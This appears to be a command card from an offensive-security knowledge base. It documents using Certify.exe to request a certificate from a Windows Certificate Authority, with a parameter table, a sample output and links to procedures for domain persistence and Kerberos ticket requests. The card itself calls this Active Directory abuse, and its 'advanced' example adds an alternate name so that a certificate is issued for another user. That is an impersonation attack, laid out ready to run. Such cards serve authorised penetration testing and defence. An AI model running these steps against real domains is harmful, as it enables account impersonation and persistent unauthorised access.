---
id: 29e5f51b-8753-4344-81dd-1572d228ecb8
name: certify-request-user-certificate
type: command
executor: powershell
data: '.\Certify.exe request /ca:$_CA_NAME\$_CA_INSTANCE /template:$_TEMPLATE_NAME'
output: null
created_at: '2023-04-06T03:56:28.361176+00:00'
updated_at: '2023-04-10T20:37:28.980808+00:00'
platforms:
  - Windows
tags:
  - certificate-enrollment
  - kerberos
verified: true
validated: true
---

# certify-request-user-certificate

## Command

```powershell
.\Certify.exe request /ca:$_CA_NAME\$_CA_INSTANCE /template:$_TEMPLATE_NAME
```

## Description

This command uses Certify.exe to request a certificate from a Windows Certificate Authority using the specified template. It authenticates with current domain credentials and is commonly used in Active Directory abuse scenarios to obtain certificates for Kerberos authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_CA_NAME | Fully qualified domain name of the CA server (e.g., CA01.megacorp.local) | Yes |
| $_CA_INSTANCE | Name of the CA instance (e.g., CA01) | Yes |
| $_TEMPLATE_NAME | Certificate template to enroll in (e.g., User) | Yes |
| /request | Flag to initiate certificate request | Built-in |

## Examples

### Basic Usage

```powershell
.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User
```

### Advanced Usage

```powershell
.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User /altname:targetuser
```

## Expected Output

Successful enrollment shows:

```
[*] Action: Request Certificate
[*] Certificate Authority: CA01.megacorp.local\CA01
[*] Template: User
[+] Certificate requested successfully!
[*] Certificate: cert.pem
[*] Private Key: key.pem
```

Failure indicates permission issues or invalid template.

## Related

- [[procedures/Request-User-Certificate-and-TGT-for-Domain-Persistence]]
- [[commands/rubeus-asktgt-with-certificate]]
